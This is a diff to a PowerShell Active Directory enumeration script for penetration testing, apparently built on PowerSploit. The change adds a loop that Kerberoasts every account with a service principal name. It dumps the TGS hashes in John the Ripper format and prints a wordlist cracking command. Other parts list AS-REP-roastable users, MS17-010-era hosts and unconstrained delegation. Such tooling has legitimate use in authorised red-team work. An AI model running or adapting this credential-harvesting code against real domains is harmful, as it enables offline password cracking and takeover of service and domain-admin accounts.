@@ -92,10 +92,12 @@ if (-Not (((Get-Module -Name "*PowerSploit*") -ne $null -or (Get-Module -Name "*
 #
 
 $CurDir = (Get-Location).Path
+$DicoPath = "$CurDir\dico\has_complexity_no_dump"
 $EnumDir = "$CurDir\results\$Domain\domain"
 $EnumMSSQLDir = "$CurDir\results\$Domain\mssql"
 $QuickWinsDir = "$EnumDir\quickwins"
-$OutputDirs = @($EnumDir,$EnumMSSQLDir,$QuickWinsDir)
+$KerberoastDir = "$EnumDir\kerberoast"
+$OutputDirs = @($EnumDir,$EnumMSSQLDir,$QuickWinsDir,$KerberoastDir)
 
 #
 # Creating output dirs
@@ -344,16 +346,6 @@ Write-Banner -Text "End-of-support Operating Systems (MS17-010)"
 Get-DomainComputer -Domain $Domain -Server $PDC.IP4Address |  Where-Object {($_.OperatingSystem -like "*XP*") -or ($_.OperatingSystem -like "*Vista*") -or ($_.OperatingSystem -like "*2003*") -or ($_.OperatingSystem -like "*Windows 7*") -or ($_.OperatingSystem -like "*Windows 8*")} | ConvertTo-Csv -NoTypeInformation | Tee-Object -File "$QuickWinsDir\deprecated_os.csv" | ConvertFrom-Csv 
 
 #
-# Kerberoast
-#
-
-Write-Banner -Text "All kerberoastable users"
-Get-DomainUser -SPN -Domain $Domain -Server $PDC.IP4Address | Where-Object {$_.samaccountname -ne 'krbtgt'} | ConvertTo-Csv -NoTypeInformation | Tee-Object -File "$QuickWinsDir\kerberoastable_all.csv" | ConvertFrom-Csv
-
-Write-Banner -Text "Kerberoastable users members of DA"
-Get-DomainUser -SPN -Domain $Domain -Server $PDC.IP4Address | ?{$_.memberof -match $DomainAdminsGroup.samaccountname -and $_.samaccountname -ne 'krbtgt'} | ConvertTo-Csv -NoTypeInformation | Tee-Object -File "$QuickWinsDir\kerberoastable_da.csv" | ConvertFrom-Csv
-
-#
 # AS_REP Roasting - no kerberos preauth
 #
 
@@ -361,11 +353,30 @@ Write-Banner -Text "Users without kerberos preauth"
 Get-DomainUser -PreauthNotRequired -Domain $Domain -Server $PDC.IP4Address | ConvertTo-Csv -NoTypeInformation | Tee-Object -File "$QuickWinsDir\users_without_krb_preauth.csv" | ConvertFrom-Csv
 
 #
+# Kerberoast
+#
+
+Write-Banner -Text "All kerberoastable users"
+$KerberoastableUsers = Get-DomainUser -SPN -Domain $Domain -Server $PDC.IP4Address | Where-Object {$_.samaccountname -ne 'krbtgt'} 
+$KerberoastableUsers | ConvertTo-Csv -NoTypeInformation | Tee-Object -File "$QuickWinsDir\kerberoastable_all.csv" | ConvertFrom-Csv
+
+Write-Banner -Text "Kerberoastable users members of DA"
+Get-DomainUser -SPN -Domain $Domain -Server $PDC.IP4Address | ?{$_.memberof -match $DomainAdminsGroup.samaccountname -and $_.samaccountname -ne 'krbtgt'} | ConvertTo-Csv -NoTypeInformation | Tee-Object -File "$QuickWinsDir\kerberoastable_da.csv" | ConvertFrom-Csv
+
+Write-Banner -Text "Kerberoasting all users"
+foreach($KerberoastableUser in $KerberoastableUsers){
+    $TgsRepOutputFile = "$KerberoastDir\tgs_rep_$(New-Guid).txt"
+    Invoke-Kerberoast -Domain $Domain -Server $PDC.IP4Address -OutputFormat john -Identity "$($KerberoastableUser.distinguishedname)" | Select-Object -ExpandProperty hash |% {$_.replace(':',':$krb5tgs$23$')} | Out-File -Append "$TgsRepOutputFile"
+}
+Write-Output "[saving into ""$TgsRepOutputFile""]"
+Write-Host -ForegroundColor yellow "`r`n[!] Now run 'john --session=""Kerberoasting"" --wordlist=""$DicoPath"" $TgsRepOutputFile'"
+
+#
 # Kerberos delegation - unconstrained
 #
 
 Write-Banner -Text "Computers with unconstrained delegation - skip DCs"
-Get-ADComputer -SearchBase $RootDSE.defaultNamingContext -Server $PDC.IP4Address -Filter {(TrustedForDelegation -eq $True) -AND (PrimaryGroupID -eq 515)} -Properties TrustedForDelegation,servicePrincipalName,Description | Format-KerberosResult | ConvertTo-Csv -NoTypeInformation | Tee-Object -File "$QuickWinsDir\unconstrained_computers.csv" | ConvertFrom-Csv
+Get-ADComputer -SearchBase $RootDSE.defaultNamingContext -Server $PDC.IP4Address -Filter {(TrustedForDelegation -eq $True) -AND (PrimaryGroupID -eq 515)} -Properties TrustedForDelegation,servicePrincipalName,Description | Format-KerberosResults | ConvertTo-Csv -NoTypeInformation | Tee-Object -File "$QuickWinsDir\unconstrained_computers.csv" | ConvertFrom-Csv
 
 Write-Banner -Text "Users with unconstrained delegation"
 Get-ADUSer -SearchBase $RootDSE.defaultNamingContext -Server $PDC.IP4Address -Filter {(TrustedForDelegation -eq $True)} -Properties TrustedForDelegation,servicePrincipalName,Description | Format-KerberosResults | ConvertTo-Csv -NoTypeInformation | Tee-Object -File "$QuickWinsDir\unconstrained_users.csv" | ConvertFrom-Csv
